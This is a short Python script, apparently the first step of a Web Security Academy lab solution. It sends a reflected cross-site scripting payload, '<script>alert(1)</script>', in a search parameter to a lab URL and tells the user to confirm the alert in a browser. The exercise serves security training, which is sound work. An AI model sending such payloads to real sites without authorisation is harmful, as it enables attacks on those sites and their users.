import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python step1_reflected_xss_alert.py <your-lab-url.web-security-academy.net>")
    sys.exit(1)

site = sys.argv[1].rstrip('/').lstrip('https://')
url = f'https://{site}/?search=<script>alert(1)</script>'

s = requests.Session()
resp = s.get(url)

print(f"[*] Sent reflected XSS payload to: {url}")
print(f"[*] HTTP Status: {resp.status_code}")
print("[*] Now visit the URL in a browser to confirm the alert box is triggered.")
